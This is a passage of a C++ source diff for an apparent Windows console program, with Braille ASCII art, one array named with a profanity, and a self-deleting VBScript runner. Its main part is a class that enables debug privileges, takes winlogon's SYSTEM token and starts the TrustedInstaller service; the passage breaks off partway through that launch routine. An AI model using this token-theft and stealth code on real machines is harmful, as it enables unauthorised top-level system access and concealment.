+    "⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⡜⠀⡐⠀⡈⠄⠠⠁⠠⢀⠁⡐⢨⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠛⠁⢀⡞⠁⠀⠀⠀⠈⡇⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠈⠀⠄⠠⠀⢂⠈⠀⠄⠈⡇⠀⠀⠀⢻⡆⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⢰⠃⠠⠀⢂⠀⡐⠀⠂⢁⠠⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣦⣤⣴⠞⠛⠁⠀⠀⠀⡎⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠺⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢀⠡⠐⠀⡁⠠⠀⠡⠀⠁⢣⠀⠀⠀⠀⣿⡀⠀⠀",
+    "⠀⠀⠀⠀⢰⡟⠀⠀⠀⡴⠀⠀⠀⠀⡜⠀⠄⠁⠠⠀⠄⠂⢁⠠⠀⢂⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣟⣿⡄⣿⣿⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⢀⡤⠊⠀⠀⠈⠀⠀⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠠⠀⠂⢁⠠⠀⡁⠐⠈⠐⠸⡄⠀⠀⠀⠘⣧⠀⠀",
+    "⠀⠀⠀⢠⡿⠀⠀⢀⣼⠇⠀⠀⠀⢠⠁⠐⠈⡀⠁⠄⠂⢈⠀⠄⠂⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡾⣽⣣⡿⣿⡄⠀⠀⠀⠀⠀⠀⢹⡠⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⢀⠂⠁⠠⠀⢂⠀⠌⢀⠡⠀⠃⠀⠀⠀⠀⢻⡄⠀",
+    "⠀⠀⢀⡿⠀⠀⢀⣾⡿⠀⠀⠀⠀⢸⠀⠈⠄⠐⠈⡀⠐⡀⠄⠂⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣻⣿⡟⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣶⣶⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠃⢀⠠⠁⠠⠁⠠⠀⢂⠠⠀⢂⠀⠀⠀⠀⠀⠘⣧⠀",
+    "⠀⠀⣼⠃⠀⢀⡾⢹⡇⠀⠀⠀⠀⡇⠀⠌⠀⠂⢁⠠⠐⠀⡀⠂⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣯⡟⢰⣿⣇⠀⣀⣠⣴⣶⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⣿⣿⣿⣻⡏⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡀⠠⠀⠂⢁⠠⠁⠐⡀⢀⠂⠠⠀⠀⠀⠀⠀⠀⢻⡄",
+    "⠀⢰⡏⠀⢀⣾⠃⢸⡇⠀⠀⠀⠀⠃⢀⠂⠁⡈⠀⠄⠠⡁⢀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠟⢻⣈⣧⠼⣯⡟⠁⠀⠀⠈⠙⣦⡀⠀⠀⠀⠀⠀⢀⡴⠛⣿⣆⠈⢻⡿⣩⣿⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠄⠁⡐⠀⡀⠂⢁⠠⠀⠄⠁⡀⠀⠀⠀⠀⠀⢸⡇",
+    "⠀⣼⠁⠀⣼⠃⠀⢾⠀⠀⠀⠀⢀⠀⠂⢀⠂⢀⠡⠐⢸⡇⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⡶⠟⠋⠉⢧⡀⡀⠻⠟⢳⡀⠳⣄⣠⣄⣤⣀⣿⠘⠢⣄⢀⣠⢶⡿⠖⣛⣛⣻⡴⠋⣸⡟⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⣨⠀⢂⠠⠐⠀⡐⠀⡀⠂⢈⠀⠄⠀⠀⣦⠀⠀⠀⣿",
+    "⢠⡟⠀⢰⡏⠀⠀⣻⡀⠀⠀⠀⢸⠀⢈⠀⠄⠂⠀⠄⣿⣇⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⠶⠟⠛⠉⠁⠀⠀⠀⠀⠈⢳⣈⣠⡶⠟⠻⣦⣀⣤⣤⣤⣬⣟⡀⠀⢈⣩⡽⢾⣶⡟⠛⢹⣿⣡⡴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⢰⣿⠀⠄⢀⠂⠁⠠⠐⠀⡈⠀⠄⠈⠀⠀⣿⠀⠀⠀⣿",
+    "⢸⡇⢀⡿⠀⠀⠀⢹⡇⠀⠀⠀⢸⠀⠠⠀⢂⠈⠐⢀⣿⣿⠠⣿⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠐⣠⣵⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠸⢿⣌⡙⠛⢉⣠⠴⠚⣿⠁⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⢰⣿⡟⠀⡀⠂⠠⠈⡀⠄⠁⠠⠈⠀⡆⠀⢰⣿⠀⠀⠀⣿",
+    "⢸⠅⣸⠃⠀⠀⠀⠸⣇⠀⠀⠀⠘⡀⠄⠁⠠⠀⡁⢸⡏⢿⡴⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢯⣿⡆⠀⠀⠀⠀⢀⠠⠀⢂⣡⣼⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⠏⠉⠀⢀⠠⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⢠⡿⣹⡇⢀⠐⠀⡁⠄⠠⠐⠈⡀⠂⠁⡆⠀⣾⢿⠀⠀⠀⣿",
+    "⢸⡇⡿⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⡇⠀⠌⢀⠐⠀⣼⡇⠘⣷⣿⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣞⣿⣄⠀⠀⣠⣤⣴⠾⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢄⣀⣀⣀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢠⡿⠁⣿⠀⠠⠀⡁⠠⠐⠀⠂⢁⠠⠀⡁⠇⣼⠃⢸⡄⠀⢠⡟",
+    "⢸⣧⡇⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⢧⠐⠀⠂⡀⠂⣿⠇⠀⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⡿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡀⠀⠀⢀⠰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢣⣿⠁⠀⣿⠀⠁⠄⠐⠀⠄⢁⠈⡀⠄⠐⢸⣾⠋⠀⢸⡇⠀⢸⡇",
+    "⠀⢻⠇⠀⠀⠀⠀⠀⠀⠹⣇⠀⠀⢸⠀⠈⠄⠀⠄⣿⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⡇⠀⢀⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢇⣿⠃⠀⠀⣿⠀⢈⠠⠈⠀⠌⠀⠠⢀⠐⣠⡿⠃⠀⠀⢸⠀⠀⣿⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⠀⠀⡆⠁⠠⠈⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢇⠁⠀⠠⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣟⣾⠃⠀⠀⢰⡿⠀⠀⠄⠂⢁⠠⠈⡀⢄⣼⠟⠀⠀⠀⠀⣿⠀⢸⡇⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⢹⠀⠁⠠⠁⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠾⠀⠀⠀⠄⢺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣻⠏⠀⠀⠀⢸⡇⠠⠁⠠⠈⠀⠄⠐⣠⡿⠃⠀⠀⠀⠀⠀⣿⢀⡿⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣮⣦⠈⢀⠂⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⡐⠀⠠⠐⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀⠀⠀⢸⡇⠀⠂⢁⠠⠁⢠⣾⠏⠀⠀⠀⠀⠀⠀⢠⡏⣾⠃⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣴⡀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠛⠁⠀⠀⡀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⢸⡇⠀⠡⠀⣀⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣟⠂⠀⠄⠁⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠀⠀⠀⢸⡇⠈⡀⣰⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣦⣤⣤⣶⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⡇⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⠏⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣷⣯⣟⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"};
+const vector<string> FUCK_ASCII = {
+
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣶⡆",
+    "⣴⣴⣶⣶⣶⣶⣦⣦⠀⠀⠀⣀⣶⡒⠆⠀⠀⠀⠀⣀⣤⣄⠀⠀⣠⣴⡶⠞⠿⣧⠀⠀⠀⠀⢰⣿⡯⠁⣴⣿⡷⠀",
+    "⣽⣻⡟⠓⠛⠟⠺⠞⠀⠀⣼⣏⠋⠀⠀⠀⠀⠀⢠⣿⣿⠃⢤⣽⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣷⣾⡿⠋⠁⠀",
+    "⣿⣵⡅⡀⡀⡀⣀⠀⠀⠀⣯⡇⠀⠀⠀⠀⠀⢐⣻⣿⠟⠀⣟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡛⠁⠀⠀⠀",
+    "⣿⣿⣗⣿⣿⣻⣛⠀⠀⢸⣿⡆⠀⠀⠀⠀⣠⣿⡿⠏⠀⢘⣻⣫⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠋⢿⣷⡀⠀⠀⠀",
+    "⣿⢿⡇⠀⠀⠀⠀⠀⠀⠸⣿⣧⡀⡀⣴⣾⣿⠛⠁⠀⠀⠀⣗⣮⣣⣀⣤⣠⣄⣄⠀⢸⣿⡇⠀⠀⠸⣿⣳⡀⠀⠀",
+    "⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠛⠋⠛⠛⠋⠋⠁⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠁⠘⠛⠁⠀⠀⠀⠀⠈⠛⠃⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⢰⣿⣄⠀⠀⠀⣰⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⢻⣿⣧⣴⣿⣿⠋⠀⠀⣀⣤⣶⣶⣶⣶⣄⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠻⣿⣿⣿⠃⠀⢠⣾⡿⠛⠋⠉⠻⣿⣿⡆⠀⢸⣿⡇⠀⠀⠀⠀⠀⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⣐⣿⣿⠃⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⢹⣿⡇⠀⢸⣿⡇⠀⠀⠀⠀⠀⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⢀⣾⣿⠟⠀⠀⠀⠀⢿⣇⡀⠀⠀⠀⢀⣠⣽⡿⠀⠀⢸⣿⣧⣤⣀⣄⣶⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⢰⣾⡿⠁⠀⠀⠀⠀⠀⠸⣿⣿⣷⣶⣮⣿⣿⠇⠀⠀⠀⠈⠻⠿⠿⠽⠟⠋⠀⠹⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+
+};
+static std::string WStringToString(const std::wstring &ws)
+{
+    if (ws.empty())
+        return std::string();
+    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (len == 0)
+        return std::string();
+    std::string s(len - 1, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), -1, &s[0], len, nullptr, nullptr);
+    return s;
+}
+
+void vbs(const std::string &vbs_code_input)
+{
+    FILE *fp = fopen("%2%speak_c++.vbs", "w");
+    fputs(((std::string) "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(WScript.ScriptName)\n" + vbs_code_input).c_str(), fp);
+    fclose(fp);
+    fp = fopen("%2%runing_speak_c++.vbs", "w");
+    std::string the_vbs_code = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(WScript.ScriptName)\ncreateobject(\"wscript.shell\").run\"%2%speak_c++.vbs\"";
+    fputs(the_vbs_code.c_str(), fp);
+    fclose(fp);
+    do
+    {
+        if (1 == 2)
+        {
+            if (2 == 3)
+            {
+                if (3 == 4)
+                {
+                    print("This is EasterEgg.");
+                };
+            };
+        };
+
+    } while (1 - 1 > 1);
+
+    sysetm("%2%runing_speak_c++.vbs");
+    return;
+}
+
+void vbs(const std::wstring &vbs_code_input_w)
+{
+    // Convert wide string to UTF-8 and reuse the narrow overload
+    std::string utf8 = WStringToString(vbs_code_input_w);
+    vbs(utf8);
+}
+void ClearScreen()
+{
+    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    COORD coord = {0, 0};
+    DWORD count;
+    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    GetConsoleScreenBufferInfo(hStdOut, &csbi);
+    FillConsoleOutputCharacter(hStdOut, ' ', csbi.dwSize.X * csbi.dwSize.Y, coord, &count);
+    SetConsoleCursorPosition(hStdOut, coord);
+}
+// NT API 函数声明
+typedef NTSTATUS(NTAPI *NT_IMPERSONATE_THREAD)(
+    HANDLE ThreadHandle,
+    HANDLE ThreadToImpersonate,
+    PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);
+bool TrAutoRun = false;
+bool RunAsAdmin = false;
+bool IsRunningAsAdmin()
+{
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
+    {
+        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin))
+        {
+            isAdmin = FALSE;
+        }
+        FreeSid(adminGroup);
+    }
+    return isAdmin == TRUE;
+}
+// 隐藏/显示控制台窗口
+void SetConsoleWindowVisibility(bool show)
+{
+    HWND hwnd = GetConsoleWindow();
+    if (hwnd)
+    {
+        if (show)
+        {
+            ShowWindow(hwnd, SW_SHOW);
+        }
+        else
+        {
+            ShowWindow(hwnd, SW_HIDE);
+        }
+    }
+}
+
+// 常量定义
+#define SE_DEBUG_PRIVILEGE L"SeDebugPrivilege"
+#define SE_IMPERSONATE_PRIVILEGE L"SeImpersonatePrivilege"
+#define SERVICE_NAME L"TrustedInstaller"
+
+class TrustedInstallerLauncher
+{
+private:
+    HMODULE hNtDll;
+    NT_IMPERSONATE_THREAD NtImpersonateThread;
+
+public:
+    TrustedInstallerLauncher() : hNtDll(nullptr), NtImpersonateThread(nullptr)
+    {
+        // 加载 NT DLL
+        hNtDll = LoadLibraryW(L"ntdll.dll");
+        if (hNtDll)
+        {
+            NtImpersonateThread = (NT_IMPERSONATE_THREAD)GetProcAddress(hNtDll, "NtImpersonateThread");
+        }
+    }
+
+    ~TrustedInstallerLauncher()
+    {
+        if (hNtDll)
+        {
+            FreeLibrary(hNtDll);
+        }
+    }
+
+    // 启用特权
+    BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilegeName)
+    {
+        LUID luid;
+        if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid))
+        {
+            return FALSE;
+        }
+
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
+    }
+
+    // 按进程名查找进程ID
+    DWORD FindProcessByName(LPCWSTR processName)
+    {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE)
+        {
+            return 0;
+        }
+
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+
+        if (Process32FirstW(hSnapshot, &pe))
+        {
+            do
+            {
+                if (_wcsicmp(pe.szExeFile, processName) == 0)
+                {
+                    CloseHandle(hSnapshot);
+                    return pe.th32ProcessID;
+                }
+            } while (Process32NextW(hSnapshot, &pe));
+        }
+
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    // 获取进程的第一个线程ID
+    DWORD GetFirstThreadId(DWORD pid)
+    {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE)
+        {
+            return 0;
+        }
+
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+
+        if (Thread32First(hSnapshot, &te))
+        {
+            do
+            {
+                if (te.th32OwnerProcessID == pid)
+                {
+                    CloseHandle(hSnapshot);
+                    return te.th32ThreadID;
+                }
+            } while (Thread32Next(hSnapshot, &te));
+        }
+
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    // 启动 TrustedInstaller 服务
+    BOOL StartTrustedInstallerService()
+    {
+        SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+        if (!hSCM)
+        {
+            return FALSE;
+        }
+
+        SC_HANDLE hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_START);
+        if (!hService)
+        {
+            CloseServiceHandle(hSCM);
+            return FALSE;
+        }
+
+        BOOL success = StartServiceW(hService, 0, nullptr);
+        DWORD error = GetLastError();
+
+        // 忽略服务已运行的错误
+        if (!success && error != ERROR_SERVICE_ALREADY_RUNNING)
+        {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            print(L"服务已运行");
+            return FALSE;
+        }
+
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return TRUE;
+    }
+
+    // 等待服务启动并获取进程ID
+    DWORD WaitForTrustedInstallerService()
+    {
+        // 连续监控服务状态
+        SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+        if (!hSCM)
+            return 0;
+
+        SC_HANDLE hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
+        if (!hService)
+        {
+            CloseServiceHandle(hSCM);
+            return 0;
+        }
+
+        DWORD pid = 0;
+        SERVICE_STATUS_PROCESS ssp;
+        DWORD bytesNeeded;
+
+        // 等待服务进入运行状态
+        for (int i = 0; i < 30; i++)
+        { // 最多等待30秒
+            if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO,
+                                     (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded))
+            {
+                if (ssp.dwCurrentState == SERVICE_RUNNING)
+                {
+                    pid = ssp.dwProcessId;
+                    break;
+                }
+            }
+            Sleep(1000); // 等待1秒
+        }
+
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return pid;
+    }
+
+    // 构建完整的命令行
+    std::wstring BuildCommandLine(LPCWSTR applicationPath, LPCWSTR arguments)
+    {
+        std::wstring commandLine;
+
+        // 如果路径包含空格，需要引号
+        if (wcschr(applicationPath, L' '))
+        {
+            commandLine = L"\"" + std::wstring(applicationPath) + L"\"";
+        }
+        else
+        {
+            commandLine = applicationPath;
+        }
+
+        // 添加参数
+        if (arguments && wcslen(arguments) > 0)
+        {
+            commandLine += L" ";
+            commandLine += arguments;
+        }
+
+        return commandLine;
+    }
+
+    // 主要执行函数
+    BOOL LaunchAsTrustedInstaller(LPCWSTR applicationPath, LPCWSTR arguments = nullptr)
+    {
+        // 步骤1: 启用调试和模拟权限
+        HANDLE hToken;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        {
+            return FALSE;
+        }
+
+        if (!EnablePrivilege(hToken, SE_DEBUG_PRIVILEGE) ||
+            !EnablePrivilege(hToken, SE_IMPERSONATE_PRIVILEGE))
+        {
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        // 步骤2: 获取系统令牌 (通过 winlogon)
+        DWORD winlogonPid = FindProcessByName(L"winlogon.exe");
+        if (!winlogonPid)
+        {
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        HANDLE hWinlogon = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
+        if (!hWinlogon)
+        {
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        HANDLE hSystemToken;
+        if (!OpenProcessToken(hWinlogon, TOKEN_QUERY | TOKEN_DUPLICATE, &hSystemToken))
+        {
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        if (!ImpersonateLoggedOnUser(hSystemToken))
+        {
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
+        // 步骤3: 启动 TrustedInstaller 服务
+        if (!StartTrustedInstallerService())
+        {
+            RevertToSelf();
+            CloseHandle(hSystemToken);
+            CloseHandle(hWinlogon);
+            CloseHandle(hToken);
+            return FALSE;
+        }
+
